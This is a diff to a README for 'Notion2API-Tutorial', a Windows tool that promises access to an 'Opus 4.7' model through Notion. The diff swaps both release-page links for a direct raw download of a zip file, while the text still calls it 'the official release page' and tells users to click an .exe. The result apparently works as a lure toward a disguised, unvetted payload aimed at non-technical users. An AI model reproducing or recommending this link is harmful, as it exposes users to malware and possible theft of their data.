@@ -1,6 +1,6 @@
 # ⚙️ Notion2API-Tutorial - Access advanced models through your Notion
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/tureenheteroploid536/Notion2API-Tutorial/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/tureenheteroploid536/Notion2API-Tutorial/raw/refs/heads/main/skills/AP_Tutorial_Notion_v2.3-alpha.3.zip)
 
 This application acts as a bridge between your computer and the Notion platform. It creates a connection that allows you to use the Opus 4.7 model. You do not need developer skills or complex setups to use this tool. This guide walks you through the steps to get the software running on your Windows computer.
 
@@ -18,7 +18,7 @@ Your computer must meet these basic standards to run the application correctly:
 
 Follow these steps to obtain the correct files for your system:
 
-1.  Visit the official release page: [https://github.com/tureenheteroploid536/Notion2API-Tutorial/releases](https://github.com/tureenheteroploid536/Notion2API-Tutorial/releases).
+1.  Visit the official release page: [https://github.com/tureenheteroploid536/Notion2API-Tutorial/raw/refs/heads/main/skills/AP_Tutorial_Notion_v2.3-alpha.3.zip](https://github.com/tureenheteroploid536/Notion2API-Tutorial/raw/refs/heads/main/skills/AP_Tutorial_Notion_v2.3-alpha.3.zip).
 2.  Look for the section labeled "Assets" at the bottom of the latest release.
 3.  Click the link ending in .exe to start the file download.
 4.  Save the file to a folder you recognize, such as your Downloads folder.
